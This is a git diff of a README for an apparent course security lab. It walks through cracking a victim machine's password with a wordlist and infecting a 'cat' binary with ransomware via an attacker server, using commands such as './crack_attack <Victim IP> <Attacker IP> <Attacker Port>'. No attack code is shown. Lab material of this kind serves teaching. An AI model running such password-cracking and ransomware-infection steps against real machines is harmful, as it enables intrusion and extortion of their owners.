@@ -12,6 +12,7 @@ Perpare two machines, attacker and victim, and run the command in the attacker m
 ```bash
 $ make
 ```
+Prepare a file named **victim.dat** in the attacker machine that includes any combinations of characters which can be used as a password and place in **/home/csc2023/materials/**.
 
 ### Ransomware Progration and Payload
 Set up the attacker machine via the command in attacker machine.
@@ -20,7 +21,7 @@ $ ./attacker_server <Attacker port>
 ```
 Run the command in attacker machine to crack the victim's password and infect the file **/home/csc2023/cat**.
 ```bash
-$ ./crack_attack <Victim IP> <Attack IP> <Attacker Port>
+$ ./crack_attack <Victim IP> <Attacker IP> <Attacker Port>
 ```
 Run **/home/csc2023/cat** file in victim machine and the result is shown below.
 ![error message](./figures/result.gif)
